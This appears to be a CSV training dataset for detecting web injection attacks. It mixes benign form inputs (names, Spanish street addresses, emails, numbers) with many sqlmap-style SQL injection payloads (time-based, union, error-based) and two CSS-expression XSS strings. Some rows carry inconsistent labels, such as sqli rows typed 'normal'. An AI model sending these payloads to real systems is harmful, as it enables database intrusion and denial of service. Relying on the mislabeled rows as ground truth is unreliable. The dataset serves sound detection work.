Text,attack_type,Label,type
3636105969407891,norm,0,normal
"1"")) as sgln where 7573=7573;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
olsen,norm,0,normal
ansaldo villapando,norm,0,normal
larguey@erasmusrooms.qa,norm,0,normal
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""gydr"" like ""gydr",sqli,1,sql
1214,norm,0,normal
"isabel la catolica, 34",norm,0,normal
"1;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('toft'='toft",sqli,1,sql
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""pnsz"" like ""pnsz",sqli,1,normal
guils de cerdanya,norm,0,normal
durbahn,norm,0,normal
sabanea9,norm,0,normal
queral queral,norm,0,normal
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- loao",sqli,1,sql
mosen agustin jerico 183 2h,norm,0,normal
1 and 6969=(select 6969 from pg_sleep(5))# pkcp,sqli,1,sql
hubach larrumbe,norm,0,normal
"1);call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1,sql
503,norm,0,normal
"-8783')) union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",sqli,1,sql
waite,norm,0,normal
"1"" rlike sleep(5)",sqli,1,normal
felicitas,norm,0,normal
"1"") union all select null,null,null,null,null,null,null#",sqli,1,sql
18772944e,norm,0,normal
"-8133') union all select 6417,6417,6417,6417,6417,6417,6417,6417--",sqli,1,sql
95554434z,norm,0,normal
nineteen@drivinn.int,norm,0,normal
robin,norm,0,normal
1'+(select 'ozpm' where 6939=6939 rlike (select (case when (7689=7689) then 1 else 0x28 end)))+',sqli,1,sql
mewa,norm,0,normal
22215,norm,0,normal
0446161008040688,norm,0,normal
"1)) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
cane5o,norm,0,normal
garabatos,norm,0,normal
bertra canamasa,norm,0,normal
1)) as rbcf where 1053=1053;select (case when (3325=1767) then 3325 else 3325*(select 3325 from mysql.db) end)#,sqli,1,sql
25136,norm,0,normal
1%');waitfor delay '0:0:5' and ('%'=',sqli,1,sql
5672,norm,0,normal
23690,norm,0,normal
1');waitfor delay '0:0:5'--,sqli,1,sql
"1%"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",sqli,1,sql
1%'));select case when 3920=4402 then 1 else null end--,sqli,1,sql
"1"") union all select null,null,null,null,null,null,null,null#",sqli,1,sql
galt@automovilesalhambra.kr,norm,0,normal
terri,norm,0,normal
1 or sleep(5),sqli,1,normal
"1"" where 8333=8333;select pg_sleep(5)--",sqli,1,sql
"1%') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('%'='",sqli,1,sql
adjani@zoorapia.ma,norm,0,normal
7912641322144923,norm,0,normal
(case when 5640=5640 then 5640 else null end),sqli,1,normal
"enparantza concordia 47,",norm,0,normal
freiss@turinga.tn,norm,0,normal
vadosa,norm,0,normal
39527,norm,0,normal
socorro,norm,0,normal
-6984 order by 1#,sqli,1,normal
cdiz,norm,0,normal
-6203'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('luee'='luee,sqli,1,sql
6252,norm,0,normal
windros@waikilu.tk,norm,0,normal
1 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# lexm,sqli,1,sql
"1' or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
abdn,norm,0,normal
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'lckw'='lckw",sqli,1,sql
93234482a,norm,0,normal
1886,norm,0,normal
"1%"") or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
syamala,norm,0,normal
quilolitr-o,norm,0,normal
brogley,norm,0,normal
justino,norm,0,normal
(select 2527 from pg_sleep(5)),sqli,1,sql
056cun95v08ac497,norm,0,normal
kindelan,norm,0,normal
"mierla, la",norm,0,normal
1729966765537707,norm,0,normal
alfonso,norm,0,normal
"-6093') where 9676=9676 union all select 9676,9676,9676,9676,9676,9676--",sqli,1,sql
ar4f30a,norm,0,normal
"1%') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",sqli,1,sql
sal7orij4,norm,0,normal
31410,norm,0,normal
847,norm,0,normal
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",sqli,1,sql
havis,norm,0,normal
-7466 where 5161=5161 or 3038=3038,sqli,1,normal
-4965) as imga where 3705=3705 union all select 3705--,sqli,1,sql
brias,norm,0,normal
oseja,norm,0,normal
c/ mar caspio 9 13-g,norm,0,normal
"1'+(select 'fqkk' where 9725=9725;call regexp_substring(repeat(right(char(3702),0),500000000),null))+'",sqli,1,sql
1%'))) rlike (select (case when (7697=3334) then 1 else 0x28 end)) and ((('%'=',sqli,1,sql
baltasar,norm,0,normal
"c/ torregrossa, 3",norm,0,normal
7892581903274474,norm,0,normal
"1)) as xyuy where 6894=6894;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
bryan,norm,0,normal
ninon,norm,0,normal
colvin@freemachine.no,norm,0,normal
conmi5u52,norm,0,normal
"1) union all select null,null,null,null#",sqli,1,sql
"-1630' union all select 1971,1971--",sqli,1,sql
"1) as ndgd where 2367=2367 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
waggoner,norm,0,normal
ci2586ta,norm,0,normal
1'||(select 'yuku' where 7480=7480;begin user_lock.sleep(5); end)||',sqli,1,sql
glido,norm,0,normal
villanueva de carazo,norm,0,normal
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('xiyl' like 'xiyl",sqli,1,sql
rio de la cueza 187,norm,0,normal
"entrada purra, 122, 3?e",norm,0,normal
swanick@deseoun.jm,norm,0,normal
1')) as vwua where 8099=8099 union all select null--,sqli,1,sql
"-1376%""))) or 3458=9503 and (((""%""=""",sqli,1,normal
estanislao,norm,0,normal
vallabri visglerio,norm,0,normal
"1"") where 4739=4739 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
hembrick,norm,0,normal
2138,norm,0,normal
"c/ cardenal cisneros 58,",norm,0,normal
"-9588')) union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",sqli,1,sql
carvajal,norm,0,normal
1')) and 7533=7533 and (('pagc' like 'pagc,sqli,1,normal
"san ildefonso 133,",norm,0,normal
1));(select * from (select(sleep(5)))acdk)#,sqli,1,sql
"1%'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",sqli,1,normal
h?ele77,norm,0,normal
palera,norm,0,normal
"1%')) union all select null,null,null,null,null--",sqli,1,sql
02614,norm,0,normal
"diamante, 114,",norm,0,normal
9947210285103354,norm,0,normal
"1'||(select 'lstx' from dual where 2972=2972 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",sqli,1,sql
"calle ribadeo 78,",norm,0,normal
digenova,norm,0,normal
hartford,norm,0,normal
carstens,norm,0,normal
8795473491595155,norm,0,normal
walborn@19horas.cat,norm,0,normal
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
sallesses humara,norm,0,normal
"1""));select sleep(5) and ((""twed"" like ""twed",sqli,1,sql
"pelayo, 11 12?d",norm,0,normal
meed@peliculasen3d.va,norm,0,normal
41842m67n9c55,norm,0,normal
sincopar,norm,0,normal
laffan@phd-photodecor.bv,norm,0,normal
37439,norm,0,normal
c46pa,norm,0,normal
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('wzdo'='wzdo",sqli,1,sql
2217,norm,0,normal
arroc9era,norm,0,normal
"1' where 1093=1093 union all select null,null,null,null,null,null,null--",sqli,1,sql
trilles aedo,norm,0,normal
1%')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
8781173513237509,norm,0,normal
nierola porcel,norm,0,normal
7041334595483221,norm,0,normal
valverdejo,norm,0,normal
"passeig pavello albeniz, 12,",norm,0,normal
1') where 9538=9538;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"<div style=""width: expression(document.cookie=true);"">",xss,2,sql
lithgow_porte@a2hotels.st,norm,0,normal
1'))) and sleep(5)#,sqli,1,normal
-5313'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('wkkp' like 'wkkp,sqli,1,sql
"-5041'))) union all select 4820,4820,4820,4820,4820,4820--",sqli,1,sql
83236273d,norm,0,normal
mbrose,norm,0,normal
"1%"")) union all select null,null,null--",sqli,1,sql
kelsey@helicopter.com.kh,norm,0,normal
aras de los olmos,norm,0,normal
"1 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
alcorisa,norm,0,normal
gates,norm,0,normal
marti,norm,0,normal
aineln,norm,0,normal
"1)) as kgit where 1919=1919 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
elvian,norm,0,normal
takamine_kulky@comonuevo.bv,norm,0,normal
9589985001483437,norm,0,normal
0800405487098378,norm,0,normal
"1) where 9059=9059 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
garfiada,norm,0,normal
"avenida de la almozara 33,",norm,0,normal
dollie,norm,0,normal
"1) where 7571=7571 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
8537,norm,0,normal
"1%')) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
1%' rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
14962243f,norm,0,normal
48099287p,norm,0,normal
ulpiano,norm,0,normal
gayol,norm,0,normal
"1')) as bwjl where 8538=8538 union all select null,null,null,null,null,null,null#",sqli,1,sql
">""<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">",xss,2,normal
"calle betanzos, s/n",norm,0,normal
"-8588' union all select 2135,2135--",sqli,1,sql
2973576986367936,norm,0,normal
depravador,norm,0,normal
jeft,norm,0,normal
mccowen@esencialser.mn,norm,0,normal
"1"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""oyfz""=""oyfz",sqli,1,sql
"1"")) as tgwp where 9405=9405;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
9564,norm,0,normal
2ab130e,norm,0,normal
odiln,norm,0,normal
8554607392278464,norm,0,normal
1%';select pg_sleep(5) and '%'=',sqli,1,sql
-2050' union all select 5606#,sqli,1,sql
"av. italia, 66, 4-a",norm,0,normal
"1"")) as uycc where 4364=4364 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"") as qnmd where 5642=5642;select (case when (9318=7198) then 9318 else 9318*(select 9318 from information_schema.character_sets) end)#",sqli,1,sql
"1"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
vilassar de mar,norm,0,normal
peralejos de abajo,norm,0,normal
cendra parga,norm,0,normal
"paseo alberto palacios, 61,",norm,0,normal
0887551084770656,norm,0,normal
"1%"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""%""=""",sqli,1,sql
carminante,norm,0,normal
"-5052))) union all select 8351,8351,8351,8351#",sqli,1,sql
0andiar,norm,0,normal
alguer murillo,norm,0,normal
"1)) and 8407=(select count(*) from generate_series(1,5000000)) and ((4450=4450",sqli,1,sql
"plaza toledo 17, 12?b",norm,0,normal
aula,norm,0,normal
0756693648278192,norm,0,normal
